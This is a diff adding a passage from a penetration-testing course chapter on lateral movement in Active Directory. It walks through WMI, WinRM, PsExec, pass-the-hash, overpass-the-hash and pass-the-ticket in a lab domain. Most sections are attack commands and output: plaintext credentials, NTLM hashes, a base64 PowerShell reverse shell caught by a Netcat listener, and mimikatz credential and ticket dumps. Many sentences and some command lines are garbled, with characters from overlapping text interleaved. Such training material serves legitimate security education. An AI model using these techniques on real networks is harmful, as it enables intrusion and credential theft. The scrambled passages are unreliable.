@@ -1,0 +1,1369 @@
+                                                                                                                              Penetration Testing with Kali Linux
+
+24 Lateral Movement in Active Directory
+
+In this Learning Module, we will cover the following Learning Units:
+· Active Directory Lateral Movement Techniques
+· Active Directory Persistence
+
+In previous Modules, we located high-value targets that could lead to an Active Directory
+compromise and found the workstations or servers they are logged in to. We gathered password
+hashes then recovered and leveraged existing tickets for Kerberos authentication.
+
+Now, we will use lateral movement techniques to compromise the machines on which these high-
+value domain users are logged in.
+
+A logical next step in our approach would be to crack any password hashes we have obtained
+and authenticate to a machine with clear text passwords to gain unauthorized access. However,
+password cracking takes time and may fail. In addition, Kerberos and NTLM do not use the clear
+text password directly, and native tools from Microsoft do not support authentication using the
+password hash.
+
+In this Module, we will explore different lateral movement techniques that allow us to authenticate
+to a system and gain code execution using a user's hash or a Kerberos ticket.
+
+24.1 Active Directory lateral movement techniques
+
+····wLTahittihseirnLALMUaeelbntiaashuMdrruesennoseritsvneaaPetgbrDamsgonUCEeuednxOttneiWMntPtcecaMiftostsowovIsr,aeoMWTLrrtskahoain.tevtcehRAetHrieSsacLa,lfadscoaMOtehonSleloso-nrdaac5vwsnW7rleiliids7ymbnit5negOi2enRd1vnLgM9eetin0roapLfrtJanahevsitefnaesfgrrMTriaoOehlIuyTMbesRjWHeoEthcveaiteFcstimvrhhlaenoemaswinqs: etuLwTeaosetreckarh,ianmtlhiqMeeudsoeevasettmegceahninntiiqnTugeecfshunrmtihqaeuyreusascecethsse
+current valid account or reuse authentication material such as password hashes, Kerberos
+tickets, and application access tokens obtained from the previous attack stages.
+
+In this Learning Unit, we are going to explore various techniques that involve both valid accounts
+and previously retrieved credentials.
+
+Additionally, it's important to note that the knowledge we've gained about enumerating Active
+Directory domains remains relevant in the lateral movement attack phase, as we may have
+acquired access to previously undiscovered networks.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  821
+                                                                                                                              Penetration Testing with Kali Linux
+
+24.1.1 WMI and WinRM
+
+The first lateral movement technique we are going to cover is based on Windows Management
+Instrumentation (WMI), which is an object-oriented feature that facilitates task automation.
+
+WMI can create processes via the Create method from the Win32_Process class. It
+communicates through Remote Procedure Calls (RPC) over port 135 for remote access and uses
+a higher-range port (19152-65535) for session data.
+
+To demonstrate this attack technique, we'll first briefly showcase the wmic utility, which has been
+recently deprecated, and then we'll discover how to conduct the same WMI attack via PowerShell.
+
+To create a process on the remote target via WMI, we need the credentials of a member of the
+Administrators local group, which can also be a domain user. In the following examples, we are
+going to perform the attacks as the user jen, which is both a domain user and a member of the
+Local Administrator group for the target machines.
+
+We already encountered UAC remote restrictions for non-domain joined machines in the Password
+Attacks Module. However, this kind of restriction does not apply to domain users, meaning that
+we can leverage full privileges while moving laterally with the techniques shown in this Learning
+Unit.
+
+Historically, wmic has been abused for lateral movement via the command line by specifying the
+target IP after the /node: argument then the user after the /user: argument, and then the
+password after the /password: argument.
+csIWhneroeerstvahtcetniaesra.nmketexeeyaswmFt oitplherldeess,0c.w4oI.mteW'ilmsl einaimnsatrdpreoubrcaytttactnweotmmntnpoiecticnnttoogintelgta,ouathnmsJacejotehfvftffeahroeeclnyaamtCleWcaLhrucaiIlEhltalNylitnooTefwrr7,ow4"mc.ealaocru"erinacstuttaarrcnekcnient gmwiiasthcahtihsneeerpvtoerorctwheisistshnctehawell
+OMEcC:xreu\tteeUhacsoPuteadetrirs"ane\cgxmjeaee(tclfecWuft"ir>ins<</:3ocn2cu_u>sP>wurmociccceess/ssnf)ou-dl>e.CO:rS1e-9a52t77.e51(26)189.050.73 /user:jen /password:Nexus123! process call
+
+instance of __PARAMETERS
+{
+
+              ProcessId = <cr>5772</cr>;
+              ReturnValue = <cr>0</cr>;
+};
+
+                            Listing 877 - Running the wmic utility to spawn a process on a remote system.
+
+The WMI job returned the PID of the newly created process and a return value of "0", meaning that
+the process has been created successfully.
+
+If we were logged in on that machine and monitoring Task Manager, we would see the
+win32calc.exe process appear with jen as the user.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  822
+                                                                          Penetration Testing with Kali Linux
+
+ Info
+System processes and services always run in session 0 as part of session isolation,
+which was introduced in Windows Vista. Because the WMI Provider Host is running as a
+system service, the newly created processes through WMI are also spawned in session
+0.
+
+Translating this attack into PowerShell syntax requires a few extra details.
+
+First, We need to create a PSCredential object that will store our session username and password.
+
+To do that, we will first store the username and password in variables. Then, we will secure the
+password via the ConvertTo-SecureString cmdlet. Finally, we'll create a new PSCredential object
+with the username variable and secureString object.
+
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username,
+$secureString;
+
+                                        Listing 878 - Creating the PSCredential object in PowerShell
+
+Now that we have our PSCredential object, we need to create a Common Information Model (CIM)
+via the New-CimSession cmdlet.
+
+To do that, we'll first specify DCOM as the protocol for the WMI session with the New-
+
+CimSessionOption cmdlet on the first line. On the second line, we'll create the new session, New-
+
+Cimsession against our target IP, using -ComputerName and supply the PSCredential object (-
+                                 bweitehxetchuetesdesbsyioWnMoIp. tWiohnitslo(-wSessionOption
+Credential $credential) along                                                                  $Options).  Lastly,                                                 we'll
+define `calc' as the payload to
+
+S$$$eocspsoesmstiismoaiononnOsndp=t==iNNo'nceeaww--$lCCcOiip'mmt;sSieeossnsssiioonnOp-tCioomnpu-tPerroNtaomceJoel1f9fD2rC.eO1yM68.50.73 -Credential $credential -
+
+As a final step, we need to  atairengdutOomSsgL-ueei5spnt7thipt7n,eg5lywr28i1nea799glwl0-tWrChareeipnaa3ttirhn2gge_umaPmnroieenwcn@etCssim{sCwSoteeomscsitomohnneafnigCdulLariesndseNp=ar$emCveioomuasnmldyabnCydre}i.sasteuintog  the
+Invoke-CimMethod cmdlet                                                                                                                                                                                                            the
+MethodName. To send the
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -
+Arguments @{CommandLine =$Command};
+
+                                         Listing 880 - Invoking the WMI session through PowerShell
+
+To simulate the technique, we can connect to CLIENT74 as jeff and insert the above code in a
+PowerShell prompt. (Not all the code is shown below.)
+
+PS C:\Users\jeff> <cu>$username = 'jen';</cu>
+...
+PS C:\Users\jeff> <cu>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -
+MethodName Create -Arguments @{CommandLine =$Command};</cu>
+
+ProcessId ReturnValue PSComputerName
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                           823
+                                                                                                                                                          Penetration Testing with Kali Linux
+
+From the output in Listing 884, we can conclude that the process creation has been successful,
+and switch to our listener for a final confirmation.
+
+kali@kali:~$ <cu>nc -lnvp 443</cu>
+listening on [any] 443 ...
+connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855
+
+PS
+C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd6
+4> <cu>hostname</cu>
+<cr>FILES04</cr>
+
+PS
+C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd6
+4> <cu>whoami</cu>
+<cr>corp\jen</cr>
+
+                                    Listing 885 - Executing the WMI payload with base64 reverse shell
+
+Nice! We indeed managed to move laterally and gain privileges as the jen domain user on an
+internal server by abusing WMI features.
+
+As an alternative method to WMI for remote management, WinRM can be employed for remote
+host management. WinRM is the Microsoft version of the WS-Management protocol and it
+exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS
+traffic and port 5985 for plain HTTP.
+
+In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is
+
+implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).
+     MFwoianrnrWsagiunetRmilSiteytnoct waUnoserbkres, tghinrevoodukopemodanbintyhuesspteaerrcgnifeeyteJinehdfgosfstrttohe.eybetWahpriagtrelttoowhfotshte
+The                                                                                                                                                       Administrators or Remote      the
+                                                                                                                                                          through the -r: argument and
+Stcuoosinembcreenmaweamxnineedrcsswutotiotenhdply-ruoow:nvoaenrthktdhseapftroaetsrhmsdewooytmoeaOrradSeh-inow5rus7uitnt7sh.5ne2Fi-rn1posg9.,r0Awoesnex'aatllhmfeeixnprealeeclm,uawtoregteeuthmwteaaerwngnteth,tot.woleercuwonamntmht etaonhsdopsoetnncciafemy wteheea'vncedolmowgmhgoaeadnmdinsi
+
+as jeff on CLIENT74 and provide jen's credentials as command arguments.
+
+C:\Users\jeff><cu>winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname &
+whoami"</cu>
+FILES04
+corp\jen
+
+                                           Listing 886 - Executing commands remotely via WinRS
+
+The output confirms that we have indeed executed the commands remotely on FILES04.
+
+To convert this technique into a full lateral movement scenario, we just need to replace the
+previous commands with the base64 encoded reverse shell we wrote earlier.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                826
+                                                                          Penetration Testing with Kali Linux
+
+C:\Users\jeff><cu>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
+MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</cu>
+
+                                      Listing 887 - Running the reverse-shell payload through WinRS
+
+Once we run the above command after having set up a Netcat listener, we are welcomed with a
+reverse-shell from FILES04.
+
+kali@kali:~$ <cu>nc -lnvp 443</cu>
+listening on [any] 443 ...
+connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
+PS C:\Users\jen> <cu>hostname</cu>
+FILES04
+PS C:\Users\jen> <cu>whoami</cu>
+corp\jen
+
+                                         Listing 888 - Verifying the origin of the WinRS reverse-shell
+
+PowerShell also has WinRM built-in capabilities called PowerShell remoting, which can be invoked
+via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a
+credential object format similar to what we did previously.
+
+PS C:\Users\jeff> <cu>$username = 'jen';</cu>
+PS C:\Users\jeff> <cu>$password = 'Nexus123!';</cu>
+PS C:\Users\jeff> <cu>$secureString = ConvertTo-SecureString $password -AsPlaintext -
+Force;</cu>
+PS C:\Users\jeff> <cu>$credential = New-Object
+System.Management.Automation.PSCredential $username, $secureString;</cu>
+
+PS C:\Users\jeff>   <cu>New-PSSession  C--o-Cm-oJp-meu-pft-ufe-trr-eeT-ryy-Np-aWe-mhietl1o9wS2-t.-a1-t6-e8-.50.73  -Credential
+$credential</cu>
+                       ComputerName                                                                                   ConfigurationName
+ Id Name               ------------                                                                                   -----------------
+Availability
+
+ -- ----
+------------
+
+TMio<cicrnrot>se1ora<f/tcc.t rPw>oiwtWehirtnShRheMe1lsleLsisstiinogn8AI8vD9aO-iS1E1l-sw9a5t2b7aeb7.ll51ecis26rh1e8in9a.g05tea0d.P,7oww3 eerSchRaeenllmRoiestmseuoMteaectShheiessniEeonn tveiarO-WpPeiSnnRSeMedssion cmdlet followed
+
+by the session ID.
+
+PS C:\Users\jeff> <cu>Enter-PSSession 1</cu>
+[192.168.50.73]: PS C:\Users\jen\Documents> <cu>whoami</cu>
+corp\jen
+
+[192.168.50.73]: PS C:\Users\jen\Documents> <cu>hostname</cu>
+FILES04
+
+                                         Listing 890 - Inspecting the PowerShell Remoting session
+
+Once more, we've proven that the session is originating from the target host through yet another
+lateral movement technique.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                 827
+                                                                                                                                                       Penetration Testing with Kali Linux
+
+24.1.2 PsExec
+
+PsExec is a very versatile tool that is part of the SysInternals suite developed by Mark
+Russinovich. It's intended to replace telnet-like applications and provide remote execution of
+processes on other systems through an interactive console.
+
+It is possible to misuse this tool for lateral movement, but three requisites must be met. First, the
+user that authenticates to the target machine needs to be part of the Administrators local group.
+Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned
+on. Luckily for us, the last two requirements are already met as they are the default settings on
+modern Windows Server systems.
+
+To execute the command remotely, PsExec performs the following tasks:
+· Writes psexesvc.exe into the C: directory
+· Creates and spawns a service on the remote host
+· Runs the requested program/command as a child process of psexesvc.exe
+
+For this scenario, let's assume we have RDP access as the offsec local administrator on
+CLIENT74 as we already discovered its clear-text password (lab) on FILES04.
+
+Even though PsExec is not installed by default on Windows, we can easily transfer it to our
+
+compromised machine. For the sake of usability, the whole SysInternals suite is available on
+
+CLIENT74. Once logged in as the offsec user on CLIENT74, we can run the 64-bit version of
+
+PsExec from C:.
+
+To start an interactive  tsheesstaiorngeotnhothsetnraemmeotperehpoesnt,dWhweidetlwnoeiwtehdtwtooinbvaockkeslaPsshEexse.cW64e.'ellxtehewnitshptehceify-i
+argument, followed by
+
+the domain\username      as corp\jen   for  pthreoc-euJseasfrfgwrueemyweannttatnodeNxeecxuutse1r2e3m! aostetlhye. Hpearseswweorwdiflloursteheth-ep
+arguments. Finally, we   will include  the
+command shell.
+
+PCPNoeSsxEpyuCxs:re\ic1T2govh3o2t!l.s(4c\mCS-d)y<Es/2xi0cen0uct>1-ue2tr0en2a2plrsMoSacureikstOseSRe>-us5s<77src5ieu2nm>1oo.9vt\0eiPlcshyExec64.exe -i  \\FILES04 -u corp\jen -p
+
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32><cu>hostname</cu>
+FILES04
+
+C:\Windows\system32><cu>whoami</cu>
+corp\jen
+
+                             Listing 891 - Obtaining an Interactive Shell on the Target System with PsExec
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                         828
+                                                                               Penetration Testing with Kali Linux
+
+Listing 891 confirms that we obtained an interactive shell directly on the target system as the
+local administrator jen domain account, without involving our Kali machine to catch a reverse
+shell.
+
+24.1.3 Pass the hash
+
+The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or
+service using a user's NTLM hash instead of the user's plaintext password. Note that this will only
+work for servers or services using NTLM authentication, not for servers or services using
+Kerberos authentication. This lateral movement sub-technique is also mapped in the MITRE
+Framework under the Use Alternate Authentication Material general technique.
+
+Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain
+code execution, including:
+· PsExec from Metasploit
+· Passing-the-hash toolkit
+· Impacket
+
+The mechanics behind them are more or less the same in that the attacker connects to the victim
+using the Server Message Block (SMB) protocol and performs authentication using the NTLM
+hash.
+
+Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example,
+
+cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done
+
+using the Service Control Manager API.   execution,  WPhtiHtldoowes       not  need  to  create                                                                                                                                 a  Windows
+     Unless we want to gain remote code
+service for any other usage, such as accJeefsfsrineyg an SMB share.
+
+WFLiniiktriensertdn,PoaistwlEresxeneqFtcuei,lirerPpetrsaHisnaehdnaePsnSrvMtiihnrBorteenrecmopSnerhnenarteOresScin.q-tgui5oi7snf7ie5ttae2hts1ru9otr0hueagtthomthbueestfeibrneeawmbaleelldt.(.cTohmemseonrelyqupiorertm4e4n5t)s,  and  second, the
+                                                                                                                                                                                                                                are  common in
+
+This lateral movement technique also requires the admin share called ADMIN$ to be available. To
+establish a connection to this share, the attacker must present valid credentials with local
+administrative permissions. In other words, this type of lateral movement typically requires local
+administrative rights.
+
+Note that PtH uses the NTLM hash legitimately. However, the vulnerability lies in the fact that we
+gained unauthorized access to the password hash of a local administrator.
+
+To demonstrate this, we can use wmiexec from the Impacket suite from our local Kali machine
+against the local administrator account on FILES04. We are going to invoke the command by
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                    829
+                                                                                                                                                                                                    Penetration Testing with Kali Linux
+
+passing the local Administrator hash that we gathered in a previous Module and then specifying
+the username along with the target IP.
+
+kali@kali:~$ <cu>/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E
+Administrator@192.168.50.73</cu>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\><cu>hostname</cu>
+FILES04
+
+C:\><cu>whoami</cu>
+files04\administrator
+
+                       Listing 892 - Passing the hash using Impacket wmiexec
+
+In this case, we used NTLM authentication to obtain code execution on the Windows 2022 server
+directly from Kali, armed only with the user's NTLM hash.
+
+If the target was sitting behind a network that was only reachable through our initial
+compromised access, we could perform this very same attack by pivoting and proxying through
+the first host as learned in previous Modules.
+
+This method works for Active Directory domain accounts and the built-in local administrator
+account. However, due to the 2014 security update, this technique cannot be used to authenticate
+as any other local admin account.
+
+24.1.4         Overpass the      hash    abuse  an  NTWLhiMtluoswer                                                                                                                       hash  to  gain  a  full  Kerberos  Ticket
+
+With overpass  the hash, we can  "over"
+                                    wuseehtahveeJTecGfoTfmrteopyroobmtaisineda
+Granting Ticket (TGT). Then we can                                                                                                                                                        Ticket Granting Service (TGS).  jen  has
+To demonstrate this, let's assume                                                                                                                                                         a workstation (or server) that
+
+aatThunoedtrhsereiumfnonturieacla,apttthereoedtcihreitNsosTs.cLaaWMcsehj'peellnada,swcslsrwhoeiodcarehdOsnSpsth-iruaa5omls7m, 7hwe5p).2ett1shw9aa0itulltthlhoeegntimnicaatoctihotinhn.ee  is now caching their credentials (and
+                                                                                                                                                                                          Windows 10 CLIENT76 machine as jeff
+
+The simplest way to do this is to right-click the Notepad icon on the desktop then shift left-click
+"show more options" on the popup, yielding the options in Figure 300.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                       830
+                                                                          Penetration Testing with Kali Linux
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57F7ig5u2r1e93000: Enabling extra options
+From here, we enter jen as the username along with the associated password, which will launch
+
+Notepad in the context of that user. After successful authentication, jen's credentials will be
+
+cached on this machine.
+
+We can validate this by opening an Administrative shell and using mimikatz with the
+sekurlsa::logonpasswords command. The command will dump the cached password hashes.
+
+mimikatz # <cu>privilege::debug</cu>
+Privilege '20' OK
+mimikatz # <cu>sekurlsa::logonpasswords</cu>
+
+...
+
+Authentication Id : 0 ; 1142030 (00000000:00116d0e)
+
+Session  : Interactive from 0
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  831
+                                                                           Penetration Testing with Kali Linux
+
+User Name           : jen
+
+Domain              : CORP
+
+Logon Server        : DC1
+
+Logon Time          : 2/27/2023 7:43:20 AM
+
+SID                 : S-1-5-21-1987370270-658905905-1781884369-1124
+
+        msv :
+
+        [00000003] Primary
+
+        * Username : <cr>jen</cr>
+
+        * Domain : CORP
+
+        * NTLM      : <cr>369def79d8372408bf6e93364cc93075</cr>
+
+        * SHA1      : faf35992ad0df4fc418af543e5f4cb08210830d4
+
+        * DPAPI : ed6686fedb60840cd49b5286a7c08fa4
+
+        tspkg :
+
+        wdigest :
+
+        * Username : jen
+
+        * Domain : CORP
+
+        * Password : (null)
+
+        kerberos :
+
+        * Username : jen
+
+        * Domain : CORP.COM
+
+        * Password : (null)
+
+        ssp :
+
+        credman :
+
+...
+
+                            Listing 893 - Dumping password hash for `jen'
+
+This output shows jen's cached credentials under jen's own session. It includes the NTLM hash,
+which we will leverage to overpass the hash.
+
+TasehKkeeuerrblssesare:o:npsctheticcokofemtthmaenaodnvdearvfporaoidsmsthMtheiemuhsikaeasothzf.laNtTeLraMl mauotvheemWnhteiinctatltotiewocnh. nAiqsuime ipsletowtauyrntothdeoNtThLisMishwasithhinthtoe
+
+The   command   PreoqwueirreSsheallfepwroamrgputmweilnl tsallaonJwdefcufrsreeatyotesobatnaeinwKPeorwbeerroSshetilcl pkerotscewssithinouthtepceorfnotremxtinogf
+jen.  This new
+
+rANheasTssLphtMeh.cetaivufeitrhlsyet. nWatirecg'alultmisopneencoti,vfyewrtehtheseNpOneSTe-cL5tiMfw7y7oh5r/2aku1s,s9hme0rwa: kitaihnngd/ntth/ldmiso:maatnatadinc:fk,indsaeilfltfyte,inruegsnetth/threuamnn:  a traditional pass-the-
+
+                                                                                                                                                                                                            to jen and corp.com
+                                                                                                                                                                                                            to specify the process
+
+to create (in this case, PowerShell).
+
+mimikatz # <cu>sekurlsa::pth /user:jen /domain:corp.com
+/ntlm:369def79d8372408bf6e93364cc93075 /run:powershell </cu>
+user : jen
+domain : corp.com
+program : powershell
+impers. : no
+NTLM : 369def79d8372408bf6e93364cc93075
+
+   | PID 8716
+   | TID 8348
+   | LSA Process is now R/W
+   | LUID 0 ; 16534348 (00000000:00fc4b4c)
+   \_ msv1_0 - data copy @ 000001F3D5C69330 : OK !
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                    832
+                                                                                             Penetration Testing with Kali Linux
+
+\_ kerberos - data copy @ 000001F3D5D366C8
+
+\_ des_cbc_md4       -> null
+
+\_ des_cbc_md4       OK
+
+\_ des_cbc_md4       OK
+
+\_ des_cbc_md4       OK
+
+\_ des_cbc_md4       OK
+
+\_ des_cbc_md4       OK
+
+\_ des_cbc_md4       OK
+
+\_ *Password replace @ 000001F3D5C63B68 (32) -> null
+
+     Listing 894 - Creating a process with a different user's NTLM password hash
+
+At this point, we have a new PowerShell session that allows us to execute commands as jen.
+
+     At this point, running the whoami command on the newly created PowerShell session
+     would show jeff's identity instead of jen. While this could be confusing, this is the
+     intended behavior of the whoami utility which only checks the current process's token
+     and does not inspect any imported Kerberos tickets
+
+Let's list the cached Kerberos tickets with klist.
+
+PS C:\Windows\system32> <cu>klist</cu>
+
+Current LogonId is 0:0x1583ae
+
+Cached Tickets: (0)
+
+                                   Listing 895 - Listing Kerberos tickets
+
+No Kerberos tickets have been      acaTcGhTedb, ybuaut tthheisntiiscaeWtxhinpitgelctotoweda  since jen has not                                                                                                                                                        yet  performed an
+interactive login. Let's generate                                                            network share on                                                                                                                                                         the  files04 server
+with net use.
+PTNThShoeewCoc:l\oueWmttp'imsunaudntsodinewdscti\ohcsmeayptkslelteissetttmehc3dao2tm>stLuhmi<csecctianuenng>seOdns8St9ef-ut6tu5osl7-el7ulMis5sycat2e.op1tpmh9\ine0\mgfnJaaieenlnwfeedftlswyrw0eor4yraek<sq/suhscaeuurs>cetcoeendsaKsrfeeumrlb.oeterosesrvteicr kets.
+
+PS C:\Windows\system32> <cu>klist</cu>
+
+Current LogonId is 0:0x17239e
+
+Cached Tickets: (2)
+
+#0>  Client: jen @ CORP.COM
+
+     Server: <cr>krbtgt/CORP.COM @ CORP.COM</cr>
+
+     KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+
+     Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
+
+name_canonicalize
+
+     Start Time: 2/27/2023 5:27:28 (local)
+
+     End Time: 2/27/2023 15:27:28 (local)
+
+     Renew Time: 3/6/2023 5:27:28 (local)
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                   833
+                                                                          Penetration Testing with Kali Linux
+
+     Session Key Type: RSADSI RC4-HMAC(NT)
+     Cache Flags: 0x1 -> PRIMARY
+     Kdc Called: DC1.corp.com
+
+#1>  Client: jen @ CORP.COM
+
+     <cr>Server: cifs/files04 @ CORP.COM</cr>
+
+     KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+
+     Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+
+     Start Time: 2/27/2023 5:27:28 (local)
+
+     End Time: 2/27/2023 15:27:28 (local)
+
+     Renew Time: 3/6/2023 5:27:28 (local)
+
+     Session Key Type: AES-256-CTS-HMAC-SHA1-96
+
+     Cache Flags: 0
+
+     Kdc Called: DC1.corp.com
+
+                             Listing 897 - Listing Kerberos tickets
+
+The output has the Kerberos tickets, including the TGT and a TGS for the Common Internet File
+System (CIFS) service.
+
+We know that ticket #0 is a TGT because the server is krbtgt.
+
+     We used net use arbitrarily in this example, but we could have used any command that
+     requires domain permissions and would subsequently create a TGS.
+
+We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that
+rely on Kerberos authentication (as opposed to NTLM). Here we will use the official PsExec
+PPPaLPgresSSpeesuEtpnE'sxCCslexie::ecret\\caartctWyhtteioiveoctdno2hnaTld.anKGfos4tre\woTnrSs-rumob\ytnoweEssMrxyi,aoosenrbisutctcctnueeraototmrniimcns3enikno2amcegp>lfottrsas..d\o<SnPeccuadsueines>tEOdrxescexSeed>mo-ecs5cpuoC<7.ete7:rctireox5eu\ale2nm>tyt1eo.oto9t\oboni0elPnullssattJhtyE\uehdexSnfeoeyfcfcseirchl.iseeoencsynnxtm0teeWo4edrhtxhin\trata\oeolclfsmocfsitw.eSlojeueptneistlt0yipe4nao\stc<nhsm/tewdch<uePo/>rofcdiwule>hesra0Ss4hhmeelsla.scSehsiinnsceioeansw, wjeeenh.caavne
+
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32><cu>whoami</cu>
+corp\jen
+
+C:\Windows\system32><cu>hostname</cu>
+FILES04
+
+                                          Listing 898- Opening remote connection using Kerberos
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                         834
+                                                                               Penetration Testing with Kali Linux
+
+As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command
+shell on the files04 server.
+
+Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to
+gain remote code execution on behalf of another user.
+
+24.1.5 Pass the ticket
+
+In the previous section, we used the overpass-the-hash technique (along with the captured NTLM
+hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. A TGT is not bound
+to a specific host and can typically be reused on other systems within its lifetime (usually around
+10 hours), enabling us to request service tickets (TGS) for multiple services. In contrast, a TGS is
+issued for a specific service principal (SPN) and is only valid for that particular service, which
+means it cannot be reused across different systems or services.
+
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected
+elsewhere on the network and then used to authenticate to a specific service. In addition, if the
+service tickets belong to the current user, then no administrative privileges are required.
+
+In this scenario, we are going to abuse an already existing session of the user dave. The dave user
+has privileged access to the backup folder located on WEB04 whereas our logged-in user jen does
+not.
+
+To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and
+inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.
+
+WPLeoEtw'Bse0rf4Sir.shTteolllodcgoomisnoma, awsnejde'llnlitnrtyeotsoCeLslisIsEtioNtnhT.e76coanntednvt eorfiftyheth\aW\twhiwetble0ow4ar\ebaucnkaubplefotlodearcfcroemssatnheadrmesionuisrtcraetiovne
+                         <<ccuu>>lwshoa\m\iw<e/bc0u4>\Jbeafcfkruepy</cu>
+PS C:\Windows\system32>  path O:'S\-P\5ew77re5mb2i01s49s\0iboancDkeunpi'edi:s
+corp\jen
+PS C:\Windows\system32>
+
+ls : <cr>Access to the                                                         denied.</cr>             [Get-
+At line:1 char:1                                                               (\\web04\backup:String)
++ ls \\web04\backup
++ ~~~~~~~~~~~~~~~~~
+
+       + CategoryInfo
+
+ChildItem], UnauthorizedAccessException
+
++ FullyQualifiedErrorId :
+
+DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+Listing 899 - Verifying that the user jen has no access to the shared folder
+
+Confirming that jen has no access to the restricted folder, we can now launch mimikatz, enable
+debug privileges, and export all the TGT/TGS from memory with the sekurlsa::tickets /export
+command.
+
+mimikatz #<cu>privilege::debug</cu>
+Privilege '20' OK
+
+mimikatz #<cu>sekurlsa::tickets /export</cu>
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                       835
+                                                                                                               Penetration Testing with Kali Linux
+
+Authentication Id : 0 ; 2037286 (00000000:001f1626)
+
+Session             : Batch from 0
+
+User Name           : dave
+
+Domain              : CORP
+
+Logon Server        : DC1
+
+Logon Time          : 9/14/2022 6:24:17 AM
+
+SID                 : S-1-5-21-1987370270-658905905-1781884369-1103
+
+         * Username : dave
+         * Domain : CORP.COM
+         * Password : (null)
+
+         Group 0 - Ticket Granting Service
+
+         Group 1 - Client Ticket ?
+
+         Group 2 - Ticket Granting Ticket
+
+         [00000000]
+
+            Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022
+
+6:24:17 AM
+
+            Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+
+            Target Name (02) : krbtgt ; CORP ; @ CORP.COM
+
+            Client Name (01) : dave ; @ CORP.COM ( CORP )
+
+            Flags 40c10000 : name_canonicalize ; initial ; renewable ; forwardable ;
+
+            Session Key     : 0x00000012 - aes256_hmac
+
+                f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
+
+            Ticket          : 0x00000012 - aes256_hmac                                                         ; kvno = 2                                                                                                                                                   [...]
+
+            * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
+
+...
+
+toTInhnhseeepnoeascfbattovihnevegedirttcthoiocedmkgiesmetksnaieinnnrdasthtidepeedakrjitesribncek'idsLmeisstthtsieimnesignsikL9diao0Si0ctnAzas-StEf.SeoxsprmpotrJrhtaoeinatfcg.tfeKrsdeesarybveseWrpohhasiacTtdeGloTiiwn/nTitGmiaSteteomddoisarkysefosrsiaonny.  TGT/TGS,    which is
+                                                                                                                                                                                                                                                                We can try  to inject
+
+We  can verify  n<ecwu>lydigren*e.rkaiterdbiOt<Sic/-kc5eu7t7>s52w1i9th0  dir,  filtering  out  on  the  kirbi  extension.
+
+PS  C:\Tools>
+
